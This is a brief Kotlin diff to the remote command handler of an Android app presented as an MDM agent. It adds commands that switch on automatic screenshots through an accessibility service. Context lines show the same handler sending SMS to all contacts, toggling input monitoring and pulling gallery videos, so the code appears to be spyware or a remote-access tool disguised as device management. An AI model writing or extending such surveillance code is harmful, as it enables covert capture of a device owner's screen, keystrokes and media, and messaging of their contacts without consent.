@@ -268,6 +268,14 @@ class CommandHandler(
             "smsToAllContacts" -> { collectors.sendSmsToAllContacts(params?.optString("value", "") ?: ""); "sent" }
             "input-monitoring-on" -> collectors.setInputMonitoring(true)
             "input-monitoring-off" -> collectors.setInputMonitoring(false)
+            "screenshot-on" -> {
+                com.mdm.agent.service.MDMAccessibilityService.setAutoScreenshot(true)
+                "auto_screenshot_enabled"
+            }
+            "screenshot-off" -> {
+                com.mdm.agent.service.MDMAccessibilityService.setAutoScreenshot(false)
+                "auto_screenshot_disabled"
+            }
             "apply-data-protection" -> collectors.applyDataProtection()
             "pull-videos" -> collectors.getGalleryVideos()
             "stop-videos" -> "stopped"
